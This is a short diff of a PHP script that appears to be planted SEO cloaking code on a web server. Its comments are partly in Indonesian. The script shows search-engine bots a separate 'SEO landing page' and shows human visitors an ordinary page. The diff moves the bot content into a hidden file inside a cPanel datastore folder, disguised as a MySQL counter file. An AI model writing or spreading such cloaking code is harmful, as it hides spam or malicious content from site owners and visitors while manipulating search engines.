@@ -12,7 +12,7 @@ function JajangFetchLocal($filePath) {
     }
 }
 
-$landing_page = __DIR__ . '/abc.txt';       // BOT â†’ SEO landing page
+$landing_page = '/home/chiacundippal/.cpanel/datastore/mysql-ku-count';
 $index_home   = __DIR__ . '/index2.txt'; // HUMAN â†’ halaman biasa
 
 if (isSearchEngineBot()) {
